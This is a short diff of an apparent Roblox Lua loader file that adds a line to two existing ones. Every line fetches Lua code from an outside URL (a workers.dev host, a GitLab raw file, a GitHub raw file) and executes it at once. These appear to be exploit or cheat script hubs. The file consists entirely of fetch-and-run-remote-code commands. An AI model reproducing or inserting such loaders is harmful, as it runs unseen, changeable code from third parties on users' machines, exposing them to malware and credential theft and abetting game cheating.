@@ -1,3 +1,5 @@
+loadstring(game:HttpGet("https://menghub.dannnnbiasalah.workers.dev/"))()
+
 loadstring(game:HttpGet("https://gitlab.com/blazars1/blazarsui/-/raw/main/kingvypers.lua"))()
 
 loadstring(game:HttpGet('https://raw.githubusercontent.com/VexoHub/VexoScript/refs/heads/main/loader.lua'))()
